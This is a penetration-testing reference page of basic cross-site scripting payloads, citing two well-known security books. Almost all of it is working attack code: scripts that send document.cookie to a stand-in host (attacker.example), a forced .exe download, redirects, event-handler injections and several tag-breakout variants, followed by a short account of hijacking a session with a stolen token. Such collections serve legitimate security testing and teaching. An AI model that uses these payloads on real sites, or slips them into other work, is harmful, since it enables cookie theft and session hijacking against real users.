# Basic Payloads

## What it is

These are straightforward XSS payload examples collected from the original mixed examples page.

## When it applies

Use these when checking whether inline script, simple tag breakouts, or event-handler execution is possible.

## Example

### Cookie stealing XSS

```html
<script>document.write('<img src="https://attacker.example/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>
```

### Forcing the download of a file

```html
<script>var link = document.createElement('a'); link.href =
       'https://downloads.example.invalid/tool.exe'; link.download = '';
        document.body.appendChild(link); link.click();</script>
```

### Redirecting a user

```html
<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
```

### Event attributes outside a `<script>` tag

```html
<b onmouseover=alert('XSS')>Click Me!</b>
<svg onload=alert(1)>
<body onload="alert('XSS')">
<img src="https://attacker.example/pixel.png"
onerror=alert(document.cookie);>
```

### Image-based exfiltration

```javascript
var i=new Image; i.src="https://attacker.example/"+document.cookie;
```

This code causes the user's browser to make a request to `attacker.example`, which is a domain reserved for documentation examples. The request contains the user's current session token for the application:

```http
GET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
Host: attacker.example
```

The attacker monitors requests to `attacker.example` and receives the user's request. He uses the captured token to hijack the user's session, gaining access to that user's personal information and performing arbitrary actions "as" the user.

### Basic tag breakouts

```html
"><script>alert(document.cookie)</script>
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
"%00"><script>alert(document.cookie)</script>
```

## Notes

The supporting notes also point to additional capture and logging payload collections:

- http://www.xss-payloads.com/payloads-list.html?c#category=capture

## Source

- Kim, Peter. *The Hacker Playbook 3: Practical Guide To Penetration Testing* (p. 54). Secure Planet. Kindle Edition.
- Stuttard, Dafydd. *The Web Application Hacker's Handbook* (Kindle Locations 11652-11656, 11992-11993, 12014-12017). Wiley. Kindle Edition.
